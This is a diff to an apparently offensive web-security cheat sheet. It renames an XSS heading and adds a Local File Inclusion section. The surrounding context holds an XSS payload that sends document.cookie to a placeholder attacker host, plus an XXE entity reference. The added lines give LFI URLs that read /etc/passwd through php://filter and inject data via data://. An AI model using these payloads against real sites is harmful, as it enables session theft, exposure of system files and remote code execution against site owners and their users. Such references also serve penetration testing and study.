@@ -120,7 +120,7 @@ try :
   <lastName>&name;</lastName>
  </userInfo>
 ```
-## Cross-Site-Scripting (XSS)
+## CROSS SITE SCRIPTING (XSS)
 * DOM Based
 > JavaScript execution happens directly in browser without any new pages being loaded or data submitted to backend code.
 * Reflected
@@ -145,6 +145,20 @@ document.write
 ```javascript
 <script>var i=new Image;i.src="http://[IP OR DOMAIN : PORT]/?"+document.cookie;</script>
 ```
+
+## LOCAL FILE INCLUSION (LFI)
+```php
+include
+require
+include_once 
+require_once
+```
+> these PHP functions might lead to LFI. It is possible to read files without executing them (like PHP likes to do) or send data like so:
+```url
+http://domain/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+http://domain/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
+```
+> LFI can lead to RCE.
 
 ## COMMAND INJECTION PAYLOADS
 ### Linux
